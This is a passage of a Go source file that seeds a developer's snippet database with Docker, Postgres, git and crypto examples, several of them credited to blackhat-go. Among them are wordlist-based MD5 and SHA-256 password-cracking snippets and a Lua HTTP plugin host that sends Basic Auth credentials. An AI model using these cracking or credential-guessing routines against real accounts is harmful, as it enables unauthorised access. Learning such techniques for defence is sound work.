 \"net/http\"\n  \"os\"\n\n  lua \"github.com/yuin/gopher-lua\"\n)\n\nconst (\n  LuaHttpTypeName = \"http\"\n  PluginsDir      = \"../../plugins\"\n)\n\nfunc register(l *lua.LState) {\n  mt := l.NewTypeMetatable(LuaHttpTypeName)\n  l.SetGlobal(\"http\", mt)\n  // static attributes\n  l.SetField(mt, \"head\", l.NewFunction(head))\n  l.SetField(mt, \"get\", l.NewFunction(get))\n}\n\nfunc head(l *lua.LState) int {\n  var (\n    host string\n    port uint64\n    path string\n    resp *http.Response\n    err  error\n    url  string\n  )\n  host = l.CheckString(1)\n  port = uint64(l.CheckInt64(2))\n  path = l.CheckString(3)\n  url = fmt.Sprintf(\"http://%s:%d/%s\", host, port, path)\n  if resp, err = http.Head(url); err != nil {\n    l.Push(lua.LNumber(0))\n    l.Push(lua.LBool(false))\n    l.Push(lua.LString(fmt.Sprintf(\"Request failed: %s\", err)))\n    return 3\n  }\n  l.Push(lua.LNumber(resp.StatusCode))\n  l.Push(lua.LBool(resp.Header.Get(\"WWW-Authenticate\") != \"\"))\n  l.Push(lua.LString(\"\"))\n  return 3\n}\n\nfunc get(l *lua.LState) int {\n  var (\n    host     string\n    port     uint64\n    username string\n    password string\n    path     string\n    resp     *http.Response\n    err      error\n    url      string\n    client   *http.Client\n    req      *http.Request\n  )\n  host = l.CheckString(1)\n  port = uint64(l.CheckInt64(2))\n  username = l.CheckString(3)\n  password = l.CheckString(4)\n  path = l.CheckString(5)\n  url = fmt.Sprintf(\"http://%s:%d/%s\", host, port, path)\n  client = new(http.Client)\n  if req, err = http.NewRequest(\"GET\", url, nil); err != nil {\n    l.Push(lua.LNumber(0))\n    l.Push(lua.LBool(false))\n    l.Push(lua.LString(fmt.Sprintf(\"Unable to build GET request: %s\", err)))\n    return 3\n  }\n  if username != \"\" || password != \"\" {\n    // Assume Basic Auth is required since user and/or password is set\n    req.SetBasicAuth(username, password)\n  }\n  if resp, err = client.Do(req); err != nil {\n    l.Push(lua.LNumber(0))\n    l.Push(lua.LBool(false))\n    l.Push(lua.LString(fmt.Sprintf(\"Unable to send GET request: %s\", err)))\n    return 3\n  }\n  l.Push(lua.LNumber(resp.StatusCode))\n  l.Push(lua.LBool(false))\n  l.Push(lua.LString(\"\"))\n  return 3\n}\n\nfunc main() {\n  var (\n    l     *lua.LState\n    files []os.FileInfo\n    err   error\n    f     string\n  )\n  l = lua.NewState()\n  defer l.Close()\n  register(l)\n  if files, err = ioutil.ReadDir(PluginsDir); err != nil {\n    log.Fatalln(err)\n  }\n\n  for idx := range files {\n    fmt.Println(\"Found plugin: \" + files[idx].Name())\n    f = fmt.Sprintf(\"%s/%s\", PluginsDir, files[idx].Name())\n    if err := l.DoFile(f); err != nil {\n      log.Fatalln(err)\n    }\n  }\n}")
	create(db, "Plugin\n(tags: plugin)\n---\n\n// plugins/plugin_name.go\n// go build -buildmode=plugin\npackage main\n\nimport \"fmt\"\n\nvar V int\n\nfunc F() { fmt.Printf(\"Hello, number %d\\n\", V) }\n\n// main.go\np, err := plugin.Open(\"plugin_name.so\")\nv, err := p.Lookup(\"V\")\nf, err := p.Lookup(\"F\")\n\n*v.(*int) = 7\nf.(func())() // prints \"Hello, number 7\"")
	create(db, "Crypto aes\n(tags: crypto aes)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"bytes\"\n  \"crypto/aes\"\n  \"crypto/cipher\"\n  \"crypto/rand\"\n  \"errors\"\n  \"fmt\"\n  \"io\"\n  \"log\"\n)\n\nfunc pad(buf []byte) []byte {\n  // Assumes valid lengths. Should add additional checks.\n  length := len(buf)\n  padding := aes.BlockSize - (length % aes.BlockSize)\n  if padding == 0 {\n    padding = aes.BlockSize\n  }\n  padded := make([]byte, length+padding)\n  copy(padded, buf)\n  copy(padded[length:], bytes.Repeat([]byte{byte(padding)}, padding))\n  return padded\n}\n\nfunc unpad(buf []byte) []byte {\n  // Assume valid length and padding. Should add checks\n  padding := int(buf[len(buf)-1])\n  return buf[:len(buf)-padding]\n}\n\nfunc encrypt(plaintext, key []byte) ([]byte, error) {\n  var (\n    ciphertext []byte\n    iv         []byte\n    block      cipher.Block\n    mode       cipher.BlockMode\n    err        error\n  )\n\n  if block, err = aes.NewCipher(key); err != nil {\n    return nil, err\n  }\n\n  iv = make([]byte, aes.BlockSize)\n  if _, err = io.ReadFull(rand.Reader, iv); err != nil {\n    log.Fatalln(err)\n  }\n\n  mode = cipher.NewCBCEncrypter(block, iv)\n\n  plaintext = pad(plaintext)\n  ciphertext = make([]byte, aes.BlockSize+len(plaintext))\n  copy(ciphertext, iv)\n  mode.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)\n\n  return ciphertext, nil\n}\n\nfunc decrypt(ciphertext, key []byte) ([]byte, error) {\n  var (\n    plaintext []byte\n    iv        []byte\n    block     cipher.Block\n    mode      cipher.BlockMode\n    err       error\n  )\n\n  if len(ciphertext) < aes.BlockSize {\n    return nil, errors.New(\"Invalid ciphertext length: too short\")\n  }\n\n  if len(ciphertext)%aes.BlockSize != 0 {\n    return nil, errors.New(\"Invalid ciphertext length: not a multiple of blocksize\")\n  }\n\n  iv = ciphertext[:aes.BlockSize]\n  ciphertext = ciphertext[aes.BlockSize:]\n\n  if block, err = aes.NewCipher(key); err != nil {\n    return nil, err\n  }\n\n  mode = cipher.NewCBCDecrypter(block, iv)\n  plaintext = make([]byte, len(ciphertext))\n  mode.CryptBlocks(plaintext, ciphertext)\n  plaintext = unpad(plaintext)\n\n  return plaintext, nil\n}\n\nfunc main() {\n  var (\n    err        error\n    plaintext  []byte\n    ciphertext []byte\n    key        []byte\n  )\n\n  key = make([]byte, 32)\n  if _, err = io.ReadFull(rand.Reader, key); err != nil {\n    log.Fatalln(err)\n  }\n\n  plaintext = []byte(\"4321123456789090\")\n  if ciphertext, err = encrypt(plaintext, key); err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"key        = %x\\n\", key)\n  fmt.Printf(\"ciphertext = %x\\n\", ciphertext)\n\n  if plaintext, err = decrypt(ciphertext, key); err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"plaintext  = %s\\n\", plaintext)\n}")
	create(db, "Crypto bcrypt\n(tags: crypto bcrypt)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"log\"\n  \"os\"\n\n  \"golang.org/x/crypto/bcrypt\"\n)\n\nvar storedHash = \"$2a$10$Zs3ZwsjV/nF.KuvSUE.5WuwtDrK6UVXcBpQrH84V8q3Opg1yNdWLu\"\n\nfunc main() {\n  // someC0mpl3xP@ssw0rd\n  var password string \n  if len(os.Args) != 2 {\n    log.Fatalln(\"Usage: bcrypt password\")\n  }\n  password = os.Args[1]\n\n  hash, err := bcrypt.GenerateFromPassword(\n    []byte(password),\n    bcrypt.DefaultCost,\n  )\n  if err != nil {\n    log.Fatalln(err)\n  }\n  log.Printf(\"hash = %s\\n\", hash)\n\n  err = bcrypt.CompareHashAndPassword([]byte(storedHash), []byte(password))\n  if err != nil {\n    log.Println(\"[!] Authentication failed\")\n    return\n  }\n  log.Println(\"[+] Authentication successful\")\n}")
	create(db, "Crypto gcm\n(tags: crypto gcm)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"crypto/aes\"\n  \"crypto/cipher\"\n  \"crypto/rand\"\n  \"errors\"\n  \"fmt\"\n  \"io\"\n  \"log\"\n)\n\nvar key = make([]byte, 32)\n\nfunc encrypt(plaintext []byte) ([]byte, error) {\n  var (\n    ciphertext []byte\n    nonce      []byte\n    block      cipher.Block\n    aead       cipher.AEAD\n    err        error\n  )\n\n  if block, err = aes.NewCipher(key); err != nil {\n    return nil, err\n  }\n\n  if aead, err = cipher.NewGCM(block); err != nil {\n    return nil, err\n  }\n\n  nonce = make([]byte, aead.NonceSize())\n  if _, err = io.ReadFull(rand.Reader, nonce); err != nil {\n    log.Fatalln(err)\n  }\n\n  ciphertext = aead.Seal(nil, nonce, plaintext, nil)\n\n  ciphertext = append(nonce, ciphertext...)\n  return ciphertext, nil\n}\n\nfunc decrypt(ciphertext []byte) ([]byte, error) {\n  var (\n    plaintext []byte\n    nonce     []byte\n    block     cipher.Block\n    aead      cipher.AEAD\n    err       error\n  )\n\n  if block, err = aes.NewCipher(key); err != nil {\n    return nil, err\n  }\n\n  if aead, err = cipher.NewGCM(block); err != nil {\n    return nil, err\n  }\n\n  nonceSize := aead.NonceSize()\n  if len(ciphertext) < nonceSize {\n    return nil, errors.New(\"Invalid ciphertext length\")\n  }\n  nonce = ciphertext[:nonceSize]\n  ciphertext = ciphertext[nonceSize:]\n\n  if plaintext, err = aead.Open(nil, nonce, ciphertext, nil); err != nil {\n    return nil, err\n  }\n\n  return plaintext, nil\n}\n\nfunc main() {\n  var (\n    err        error\n    plaintext  []byte\n    ciphertext []byte\n  )\n\n  if _, err = io.ReadFull(rand.Reader, key); err != nil {\n    log.Fatalln(err)\n  }\n\n  plaintext = []byte(\"privet\")\n  if ciphertext, err = encrypt(plaintext); err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"ciphertext = %x\\n\", ciphertext)\n\n  if plaintext, err = decrypt(ciphertext); err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"plaintext = %s\\n\", plaintext)\n}")
	create(db, "Crypto md5 hash\n(tags: crypto md5 hash)\n---\n\nhttps://github.com/blackhat-go\n\n// wordlist.txt\npassword\nPassword\nNickelback4life\nSummer2017\n\n// main.go\npackage main\n\nimport (\n  \"bufio\"\n  \"crypto/md5\"\n  \"fmt\"\n  \"log\"\n  \"os\"\n)\n\nvar md5hash = \"77f62e3524cd583d698d51fa24fdff4f\"\n\nfunc main() {\n  f, err := os.Open(\"wordlist.txt\")\n  if err != nil {\n    log.Fatalln(err)\n  }\n  defer f.Close()\n\n  scanner := bufio.NewScanner(f)\n  for scanner.Scan() {\n    password := scanner.Text()\n    hash := fmt.Sprintf(\"%x\", md5.Sum([]byte(password)))\n    if hash == md5hash {\n      fmt.Printf(\"[+] Password found (MD5): %s\\n\", password)\n    }\n  }\n\n  if err := scanner.Err(); err != nil {\n    log.Fatalln(err)\n  }\n}")
	create(db, "Crypto sha256 hash\n(tags: crypto sha256 hash)\n---\n\nhttps://github.com/blackhat-go\n\n// wordlist.txt\npassword\nPassword\nNickelback4life\nSummer2017\n\n// main.go\npackage main\n\nimport (\n  \"bufio\"\n  \"crypto/sha256\"\n  \"fmt\"\n  \"log\"\n  \"os\"\n)\n\nvar sha256hash = \"95a5e1547df73abdd4781b6c9e55f3377c15d08884b11738c2727dbd887d4ced\"\n\nfunc main() {\n  f, err := os.Open(\"wordlist.txt\")\n  if err != nil {\n    log.Fatalln(err)\n  }\n  defer f.Close()\n\n  scanner := bufio.NewScanner(f)\n  for scanner.Scan() {\n    password := scanner.Text()\n    hash := fmt.Sprintf(\"%x\", sha256.Sum256([]byte(password)))\n    if hash == sha256hash {\n      fmt.Printf(\"[+] Password found (SHA-256): %s\\n\", password)\n    }\n  }\n\n  if err := scanner.Err(); err != nil {\n    log.Fatalln(err)\n  }\n}")
	create(db, "Crypto hmac\n(tags: crypto hmac)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"crypto/hmac\"\n  \"crypto/sha256\"\n  \"encoding/hex\"\n  \"fmt\"\n)\n\nvar key = []byte(\"some random key\")\n\nfunc checkMAC(message, recvMAC []byte) bool {\n  mac := hmac.New(sha256.New, key)\n  mac.Write(message)\n  calcMAC := mac.Sum(nil)\n\n  return hmac.Equal(calcMAC, recvMAC)\n}\n\nfunc main() {\n  // In real implementations, we’d read the message and HMAC value from network source\n  message := []byte(\"The red eagle flies at 10:00\")\n  mac, _ := hex.DecodeString(\"69d2c7b6fbbfcaeb72a3172f4662601d1f16acfb46339639ac8c10c8da64631d\")\n  if checkMAC(message, mac) {\n    fmt.Println(\"EQUAL\")\n  } else {\n    fmt.Println(\"NOT EQUAL\")\n  }\n}")
	create(db, "Crypto cert tls\n(tags: crypto cert tls)\n---\n\nhttps://github.com/blackhat-go\n\n// cert for server\n// openssl req -nodes -x509 -newkey rsa:4096 -keyout serverKey.pem -out serverCrt.pem -days 365\n// Country Name (2 letter code) [AU]:\n// State or Province Name (full name) [Some-State]:\n// Locality Name (eg, city) []:\n// Organization Name (eg, company) [Internet Widgits Pty Ltd]:\n// Organizational Unit Name (eg, section) []:\n// Common Name (e.g. server FQDN or YOUR name) []:localhost\n// Email Address []:\n\n// cert for client\n// openssl req -nodes -x509 -newkey rsa:4096 -keyout clientKey.pem -out clientCrt.pem -days 365\n// Country Name (2 letter code) [AU]:\n// State or Province Name (full name) [Some-State]:\n// Locality Name (eg, city) []:\n// Organization Name (eg, company) [Internet Widgits Pty Ltd]:\n// Organizational Unit Name (eg, section) []:\n// Common Name (e.g. server FQDN or YOUR name) []:Tom\n// Email Address []:\n\n// set enviroment for build go GODEBUG=x509ignoreCN=0\n\n// curl -ik -X GET --cert clientCrt.pem --key clientKey.pem https://localhost:9443/hello\n\n// cmd/client/main.go\npackage main\n\nimport (\n  \"crypto/tls\"\n  \"crypto/x509\"\n  \"fmt\"\n  \"io/ioutil\"\n  \"log\"\n  \"net/http\"\n)\n\nfunc main() {\n  var (\n    err              error\n    cert             tls.Certificate\n    serverCert, body []byte\n    pool             *x509.CertPool\n    tlsConf          *tls.Config\n    transport        *http.Transport\n    client           *http.Client\n    resp             *http.Response\n  )\n\n  if cert, err = tls.LoadX509KeyPair(\"clientCrt.pem\", \"clientKey.pem\"); err != nil {\n    log.Fatalln(err)\n  }\n\n  if serverCert, err = ioutil.ReadFile(\"../server/serverCrt.pem\"); err != nil {\n    log.Fatalln(err)\n  }\n\n  pool = x509.NewCertPool()\n  pool.AppendCertsFromPEM(serverCert)\n\n  tlsConf = &tls.Config{\n    Certificates: []tls.Certificate{cert},\n    RootCAs:      pool,\n  }\n  tlsConf.BuildNameToCertificate()\n\n  transport = &http.Transport{\n    TLSClientConfig: tlsConf,\n  }\n  client = &http.Client{\n    Transport: transport,\n  }\n\n  if resp, err = client.Get(\"https://server.blackhat-go.local:9443/hello\"); err != nil {\n    log.Fatalln(err)\n  }\n  if body, err = ioutil.ReadAll(resp.Body); err != nil {\n    log.Fatalln(err)\n  }\n  defer resp.Body.Close()\n\n  fmt.Printf(\"Success: %s\\n\", body)\n}\n\n// cmd/server/main.go\npackage main\n\nimport (\n  \"crypto/tls\"\n  \"crypto/x509\"\n  \"fmt\"\n  \"io/ioutil\"\n  \"log\"\n  \"net/http\"\n)\n\nfunc helloHandler(w http.ResponseWriter, r *http.Request) {\n  fmt.Printf(\"Hello: %s\\n\", r.TLS.PeerCertificates[0].Subject.CommonName)\n  fmt.Fprint(w, \"Authentication successful\")\n}\n\nfunc main() {\n  var (\n    err        error\n    clientCert []byte\n    pool       *x509.CertPool\n    tlsConf    *tls.Config\n    server     *http.Server\n  )\n\n  http.HandleFunc(\"/hello\", helloHandler)\n\n  if clientCert, err = ioutil.ReadFile(\"../client/clientCrt.pem\"); err != nil {\n    log.Fatalln(err)\n  }\n  pool = x509.NewCertPool()\n  pool.AppendCertsFromPEM(clientCert)\n\n  tlsConf = &tls.Config{\n    ClientCAs:  pool,\n    ClientAuth: tls.RequireAndVerifyClientCert,\n  }\n  tlsConf.BuildNameToCertificate()\n\n  server = &http.Server{\n    Addr:      \":9443\",\n    TLSConfig: tlsConf,\n  }\n  log.Fatalln(server.ListenAndServeTLS(\"serverCrt.pem\", \"serverKey.pem\"))\n}")
	create(db, "Sign message and veryfy signature\n(tags: crypto sign message verify)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"crypto\"\n  \"crypto/rand\"\n  \"crypto/rsa\"\n  \"crypto/sha256\"\n  \"fmt\"\n  \"log\"\n)\n\nfunc main() {\n  var (\n    err                                              error\n    privateKey                                       *rsa.PrivateKey\n    publicKey                                        *rsa.PublicKey\n    message, plaintext, ciphertext, signature, label []byte\n  )\n\n  if privateKey, err = rsa.GenerateKey(rand.Reader, 2048); err != nil {\n    log.Fatalln(err)\n  }\n  publicKey = &privateKey.PublicKey\n\n  label = []byte(\"\")\n  message = []byte(\"Some super secret message, maybe a session key even\")\n  ciphertext, err = rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey, message, label)\n  if err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"Ciphertext: %x\\n\", ciphertext)\n\n  plaintext, err = rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, ciphertext, label)\n  if err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"Plaintext: %s\\n\", plaintext)\n\n  h := sha256.New()\n  h.Write(message)\n  signature, err = rsa.SignPSS(rand.Reader, privateKey, crypto.SHA256, h.Sum(nil), nil)\n  if err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"Signature: %x\\n\", signature)\n\n  err = rsa.VerifyPSS(publicKey, crypto.SHA256, h.Sum(nil), signature, nil)\n  if err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Println(\"Signature verified\")\n}")
	create(db, "Remove all images in docker\n(tags: remove image docker)\n---\n\ndocker container stop $(docker container ls -aq)\ndocker container prune -f\ndocker rmi -f $(docker images -a -q)")
	create(db, "Write ubuntu on usb flash\n(tags: ubuntu usb)\n---\n\n1. Download ubuntu from ubuntu.com\n2. Download the program Universal-USB-Installer-1.9.9.3.exe\n3. Format the usb-flash in fat32\n4. In installer chose the mode fat32\n5. With program HxD fixed the bytes of the boot sector of the usb-flash accordind the article https://habr.com/ru/post/128004/\n6. In Sector 0 at the end, assign the first byte 80h to the link ")
	create(db, "Docker enter into container\n(tags: docker enter container)\n---\n\ndocker ps\ndocker exec -it mycontainer sh\n// docker exec -it re583725uh bash\nprintenv")
	create(db, "Docker-compose enter into container\n(tags: compose enter container)\n---\n\nsudo docker-compose exec mycontainer bash")
	create(db, "Clickhouse client\n(tags: clickhouse client)\n---\n\nsudo apt install clickhouse-client\nclickhouse-client\nshow tables\nselect * from mytablename order by ts_nano desc limit 1")
	create(db, "Influx client\n(tags: influx client)\n---\n\nsudo apt install influxdb-client\ninflux\nshow databases\nuse grafana\nshow measurements\n// show series\nselect * from mytablename limit 1")
	create(db, "Shutdown linux\n(tags: shutdown linux)\n---\n\nsudo shutdown -h now\nsudo shutdown -h 21:00\nsudo shutdown -h +5 \"Computer will be shutdown after 5 minutes\"\nsudo shutdown -c // cancel shutdown")
	create(db, "Get duplicate records in clickhouse\n(tags: duplicate clickhouse)\n---\n\nselect ts_nano, count(*) from mytablename group by ts_nano having count(*) > 1")
	create(db, "Git remove remote branch\n(tags: git remove remote branch)\n---\n\ngit\n// see all upstreams in branches\ngit branch -vv\n// remove branch on server\npush origin --delete badbranchname\n// upstream remote branch by local branch\ngit branch --set-upstream-to origin/goodbranchname")
	create(db, "Backup files in bash \n(tags: bash backup zip)\n---\n\n//chmod +x /usr/sbin/backup\n\n#!/bin/bash\n\nPROJECTS_DIR=\"/home/username/projects\"\nNAME=backup_$(date +%Y_%m_%d_%H_%M)\nSTART_TIME=$(date +%s)\n\nmkdir /share/$NAME\ncp -r $PROJECTS_DIR/project1 /share/$NAME/project1\ncp -r $PROJECTS_DIR/project2 /share/$NAME/project2\ncp -r $PROJECTS_DIR/project3 /share/$NAME/project3\n\ncd /share\n\nzip -r $NAME.zip $NAME > /dev/null\n\nrm -r /share/$NAME\n\nEND_TIME=$(date +%s)\nDIFF=$(( $END_TIME - $START_TIME))\nFILE_SIZE=$(du -h /share/$NAME.zip)\n\necho \"backup $FILE_SIZE was created in $DIFF s\"")
	create(db, "Debugging golang code from terminal \n(tags: debug terminal)\n---\n\ncd root/go/src/github.com/DimitryEf/experiment        \nvi main.go        \n  write the app (i) and save it (ESC :wq)      \ngo run main.go        \ngo get github.com/go-delve/delve/cmd/dlv        \ndlv debug        \nh        \nb main.main        \nb main.go:10        \nn        \nc        \nq        \ndisass   ")
	create(db, "Postgresql json field \n(tags: postgresql json field)\n---\n\nSELECT\n  mt.jsonfield\nFROM kso.mytable mt\nWHERE mt.jsonfield->>'somefield' = 'somename'")
	create(db, "Postgresql json array \n(tags: postgresql json array)\n---\n\nSELECT * FROM\n(SELECT\n  mt.name,\n  json_array_elements(mt.jsonarray->'arrayname')->'jsonvalue' as jsonvalue\nFROM mytable mt) t\nWHERE t.jsonvalue::text = '\\\"somevalue\\\"'")
	create(db, "Postgresql loop \n(tags: postgresql loop)\n---\n\ndo $$  \ndeclare  \n  result_var text default '';  \n  counter int default 0;  \nbegin  \n  result_var := 'qwe';  \n  drop table if exists tmp_qwe;  \n  create temp table tmp_qwe(result text);  \n  insert into tmp_qwe (result) values (result_var);  \n  loop  \n  \n    counter := counter + 1;  \n    if counter = 5 then exit;  \n    end if;  \n  \n    update tmp_qwe set result = result || counter::text;  \n  end loop;  \nend $$;  \n  \nselect * from tmp_qwe;  ")
	create(db, "Solve problems with using ebiten library \n(tags: ebiten problem)\n---\n\nsudo apt-get install libglfw3 libglfw3-dev\nsudo apt-get install libx11-dev\nsudo apt install libxcursor-dev\nsudo apt install libxtst-dev\nsudo apt-get install libxcomposite-dev libxdamage-dev libxrender-dev\nsudo apt-get install libxinerama-dev\nsudo apt-get install libgl1-mesa-dev xorg-dev")
	create(db, "Debugging plugins \n(tags: debug plugin)\n---\n\n// run debug with this flag\n-gcflags=\"all=-N -l\"")
	create(db, "Git squash commits\n(tags: git squash)\n---\n\n1. specify the hash of the commit to which you need to squash other commits  \ngit rebase -I dfs878   \n2. in the editor that opens, leave pick (or p) opposite the commit to which we squash everything (the first will fit, the last will not) \n3. in other commits write squash (или s)  \n4. save the file\n5. git merges commits and prompts you to choose a name\n6. save the file\n7. ready (you may check it with git log)  ")

	create(db, "Using postgresql in docker\n(tags: postgresql docker)\n---\n\ndocker run --name some-postgres -e POSTGRES_PASSWORD=mysecretpassword -d -p 5432:5432 postgres\ndocker ps\ndocker exec -it 05b3a3471f6f bash\nroot@05b3a3471f6f:/# psql -U postgres\npostgres-# CREATE DATABASE mytest;\npostgres-# \\q\n\n// from localhost\npsql -h public-ip-server -p 5432 -U postgres")
	create(db, "Dump postgresql to sqlite\n(tags: dump postgresql sqlite)\n---\n\npackage main\n\nimport (\n  \"context\"\n  \"database/sql\"\n  \"fmt\"\n  _ \"github.com/lib/pq\"\n  _ \"github.com/mattn/go-sqlite3\"\n  \"log\"\n  \"time\"\n)\n\nfunc main() {\n  dbname := \"mydb\"\n  schema := \"myschema\"\n  postgresqlConString := \"user=myuser password=mypass dbname=mydb host=localhost port=5432 search_path=myschema sslmode=disable\"\n  sqliteConString := \"mydb.db\"\n  log.SetFlags(log.LstdFlags | log.Lshortfile)\n  t1 := time.Now()\n  transferFromSQLtoSQLite(postgresqlConString, sqliteConString, dbname, schema)\n  t := time.Since(t1)\n  ms := t.Milliseconds()\n  log.Printf(\"took time %d ms\", ms)\n}\n\nfunc transferFromSQLtoSQLite(postgresqlConString, sqliteConString, dbname, schema string) {\n\n  // connect to postgresql\n  db, err := sql.Open(\"postgres\", postgresqlConString)\n  checkErr(err)\n  ctx := context.Background()\n  err = db.PingContext(ctx)\n  checkErr(err)\n  defer db.Close()\n\n  // get all tables\n  tables, err := db.QueryContext(ctx, \"SELECT tablename FROM pg_tables WHERE schemaname = $1 ORDER BY tablename\", schema)\n  checkErr(err)\n  defer tables.Close()\n\n  // connect to sqlite, create file if not exists\n  dbsqlite, err := sql.Open(\"sqlite3\", sqliteConString)\n  checkErr(err)\n  defer db.Close()\n\n  for tables.Next() {\n\n    var tableName string\n    tables.Scan(&tableName)\n    log.Printf(\"table: %s\", tableName)\n\n    // get fields name and data type for current table\n    fields, err := db.QueryContext(ctx, \"SELECT column_name, data_type FROM information_schema.columns WHERE table_catalog = $1 AND table_schema = $2 AND table_name = $3 ORDER BY ordinal_position\", dbname, schema, tableName)\n    checkErr(err)\n\n    // create table (do not drop table! because if table exists user must see this so as not to accidentally overwrite data)\n    createTableString := buildCreateTableString(tableName, fields)\n    _, err = dbsqlite.ExecContext(ctx, createTableString)\n    checkErr(err)\n\n    // get all rows from table\n    rows, err := db.QueryContext(ctx, fmt.Sprintf(\"SELECT * FROM \\\"%s\\\".\\\"%s\\\"\", check(schema), check(tableName))\n    checkErr(err)\n    columns, err := rows.Columns()\n    checkErr(err)\n\n    // start transaction\n    tx, err := dbsqlite.Begin()\n    checkErr(err)\n\n    // prepare improves performance more than 600 times\n    stmt, err := tx.Prepare(buildPrepareString(tableName, columns))\n    checkErr(err)\n\n    // prepare args as pointers\n    args := make([]interface{}, len(columns))\n    for i := range columns {\n      args[i] = &sql.NullString{String: columns[i]}\n    }\n\n    // from postgresql to sqlite\n    count := 0\n    for rows.Next() {\n      err := rows.Scan(args...)\n      checkErr(err)\n      _, err = stmt.Exec(args...)\n      checkErr(err, args...)\n      count++\n    }\n    log.Printf(\"\\trows: %d\", count)\n\n    // commit transaction\n    err = tx.Commit()\n    checkErr(err)\n\n    rows.Close()\n    stmt.Close()\n  }\n\n}\n\nfunc buildCreateTableString(tableName string, fields *sql.Rows) string {\n  defer fields.Close()\n  res := fmt.Sprintf(\"CREATE TABLE \\\"%s\\\" (\", tableName)\n  for fields.Next() {\n    var field, dataType string\n    err := fields.Scan(&field, &dataType)\n    checkErr(err)\n    res += fmt.Sprintf(\"\\n\\t\\\"%s\\\"\\t%s,\", field, convertType(dataType))\n    log.Printf(\"\\tcolumn: %s\", field)\n  }\n  res = res[:len(res)-1]\n  res += \"\\n)\"\n  return res\n}\n\nfunc convertType(dataType string) string {\n  switch dataType {\n  case \"\\\"char\\\"\", \"character varying\", \"date\", \"text\":\n    return \"TEXT\"\n  case \"bigint\", \"boolean\", \"integer\", \"smallint\":\n    return \"INTEGER\"\n  case \"double precision\", \"numeric\", \"real\":\n    return \"REAL\"\n  case \"bytea\":\n    return \"BLOB\"\n  default:\n    return \"TEXT\"\n  }\n}\n\nfunc check(s string) string {\n\tif strings.Contains(s, \"\\\"\") {\n\t\tlog.Fatalf(\"bad char in \\\"%s\\\"\", s)\n\t}\n\treturn s\n}\n\nfunc checkErr(err error, args ...interface{}) {\n  if err != nil {\n    log.Fatalf(\"%q: %s\", err, args)\n  }\n}\n\nfunc buildPrepareString(tableName string, columns []string) string {\n  res := fmt.Sprintf(\"INSERT INTO \\\"%s\\\" (\", tableName)\n  count := 0\n  for _, col := range columns {\n    res += fmt.Sprintf(\"\\\"%s\\\",\", col)\n    count++\n  }\n  res = res[:len(res)-1]\n  res += \") VALUES (\"\n  for i := 0; i < count; i++ {\n    res += \"?,\"\n  }\n  res = res[:len(res)-1]\n  res += \")\"\n  return res\n}")
	create(db, "Graceful shutdown\n(tags: graceful shutdown)\n---\n\nfunc action(c *cli.Context) error {\n  startTime := time.Now()\n\n  finish := make(chan struct{})\n\n  ctx, cancel := context.WithCancel(context.Background())\n  go act(ctx, finish)\n  defer cancel()\n\n  go gracefulShutdown(finish, cancel)\n\n  <-finish\n  endTime := time.Since(startTime)\n  ms := endTime.Milliseconds()\n  log.Printf(\"took time: %d ms\", ms)\n\n  return nil\n}\n\nfunc gracefulShutdown(finish chan<- struct{}, cancel context.CancelFunc) {\n  interrupt := make(chan os.Signal, 1)\n  signal.Notify(interrupt, os.Interrupt, syscall.SIGTERM)\n\n  <-interrupt\n\n  log.Printf(\"interrupted, sql queries will be canceled in 3 seconds\")\n  cancel()\n  time.Sleep(3 * time.Second)\n  defer func() {\n    finish <- struct{}{}\n  }()\n}")
	create(db, "Golang hotkeys\n(tags: hotkeys goland)\n---\n\nalt+j - select the same words\nshift+enter = start new line (open file in split right)\nctrl+alt+enter - start new line before current\nctrl+w - extend selection\nctrl+shift+w - shrink selection\nctrl+shift+u - toggle case\nctrl+alt+shift+lmb (left mouse) - multiselect\nctrl+[ - move to code block start\nctrl+] - move to code block end\nctrl+shift+[ - move to code block start with select\nctrl+shift+] - move to code block end with select\nctrl+y - delete line\nctrl+delete - delete to word end\nctrl+backspace - delete to word start\nctrl+d - duplicate line or selection (compare files)\nctrl+shift+j - join lines\nctrl+shift+m - move to matching brace\nctrl+shift+insert - column selection mode\ntab - next parameter\nshift+tab - prev parameter\nf2 - next highlight editor\nshift+f2 - prev highlight editor\nctrl+alt+left - back\nctrl+alt+right - forward\nctrl+n - go to type\nctrl+shift+n - go to file\nctrl+b - go to declaration or usage\nctrl+alt+b - go to implementation\nctrl+shift+b - go to type declaration\nctrl+shift+t go to test\nctrl+f12 - file structure\nctrl+alt+shift+2 - file path\nctrl+h - type hierarchy\nctrl+shift+h - method hierarchy\nctrl+alt+h - call hierarchy\nctrl+/ - comment code\nctrl+shift+/ - comment block\nctrl+alt+l - reformat code\nctrl+alt+shift+l - reformat file\nctrl+shift+down - move statement down\nctrl+shift+up - move statement up\nctrl+alt+shif+left - move element left\nctrl+alt+shif+right - move element right\nalt+shift+down - move line down\nalt+shift+up - move line up\nshift+f6 - rename (edit changelist)\nctrl+f6 - change signature\nctrl+alt+m - extract method\nctrl+alt+n - inline\nshift+f10 - run\nshift+f9 - debug\nctrl+f2 - stop\nf8 - step over\nf7 - step into\nshift+f8 - step out\nalt+shift+9 - run to cursor\nf9 - resume\nctrl+alt+shift+p - go fmt project\nctrl+alt+g - go generate file\nalt+0 - commit window\nalt+1 - project window\nalt+2 - favorites window\nalt+3 - find window\nalt+4 - run window\nalt+5 - debug window\nalt+6 - problems window\nalt+7 - structure window\nalt+8 - services window\nalt+9 - git window\nalt+f12 - terminal window\nctrl+k - commit\nctrl+shift+k - push\nctrl+t - update project\nctrl+alt+shift+down - next change\nctrl+alt+shift+up - prev change\nctrl+alt+a - add to git\nctrl+shift+g - go file (my 